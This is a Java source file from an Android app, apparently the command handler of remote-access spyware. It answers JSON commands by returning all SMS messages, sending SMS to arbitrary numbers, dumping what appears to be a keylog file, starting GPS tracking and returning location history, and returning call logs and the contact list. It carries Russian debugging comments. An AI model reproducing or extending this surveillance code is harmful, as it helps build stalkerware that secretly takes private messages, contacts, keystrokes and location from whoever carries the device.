package com.test.myapp;

import com.test.Modules.*;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.CountDownTimer;
import android.telephony.SmsManager;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.test.Request.*;
import com.test.Response.*;

import java.util.concurrent.CountedCompleter;

public class MyHandlers {

    private Context context;
    private SmsModule smsModule;



    public MyHandlers(Context context) {
        this.context = context;
    }

    public static Object jsonToObjet(String json, Class<?> clazz) {

        json = json.substring(0, json.indexOf('}')) + "}";
        System.out.println(json);

        JsonParser parser = new JsonParser();
        JsonElement mJson =  parser.parse(json); // что тут не так?? коллизия : Response: {"header": "GPSModule", "body": "stop"}{"header": "BatteryModule", "body": ""}
        Gson gson = new Gson();
        return gson.fromJson(mJson, clazz);

    }

    public static String objectToJson(Object object) {

        Gson gson = new Gson();
        return gson.toJson(object);
    }

    public String handler(String requestJSON) {
        GET_JSON get = (GET_JSON) jsonToObjet(requestJSON, GET_JSON.class);

        if(get == null) {return "GET request equal NULL!";}

        if(get.getHeader().equals("SystemProperty")) {
            return objectToJson(SystemProperty.getSystemProperty());
        }

        if (get.getHeader().equals("SmsModule")) {
            if (get.getBody().equals("get all sms")) {
                return SmsModule.getAllSms(context);
            }
            if (get.getBody().equals("send sms")) {
                return SmsModule.sendSMS(get.getPhoneNumber(), get.getMsg());
            }
        }

        if(get.getHeader().equals("KLogModule")) {
            if(get.getBody().equals("get klog file")) {
                return objectToJson(KLogModule.getContentKLogFile());
            }
        }

        if(get.getHeader().equals("GPSModule")) {
            if(get.getBody().equals("getStatusGPSModule")) {
                return GPSModule.getStatusGPSModule();
            }
            if(get.getBody().equals("start")) {
                context.startService(new Intent(context, GPSModule.class));
                System.out.println("Достигает --------------------------------------- !!!");
                return objectToJson("GPSModule started!");
            }
            if(get.getBody().equals("stop")) {
                context.stopService(new Intent(context, GPSModule.class));
                GPSModule.GPSModule_start = "stopped";
                return objectToJson("GPSModule stopped successfully!");
            }

            if(get.getBody().equals("getGPSArray")) {
                return objectToJson(GPSModule.getResponse());
            }
        }

        if(get.getHeader().equals("CallModule")) {
            if(get.getBody().equals("get call details")) {
                return CallModule.getCallDetails(context);
            }
            if(get.getBody().equals("get contact list")) {
                return CallModule.getContactList(context);
            }
        }

        if(get.getHeader().equals("BatteryModule")) {
            return BatteryModule.BATTERY_LEVEL;
        }


        POST_JSON errorPost = new POST_JSON();
        errorPost.setHeader(get.getHeader());
        errorPost.setBody("Error 404");
        return objectToJson(errorPost);
    }

}
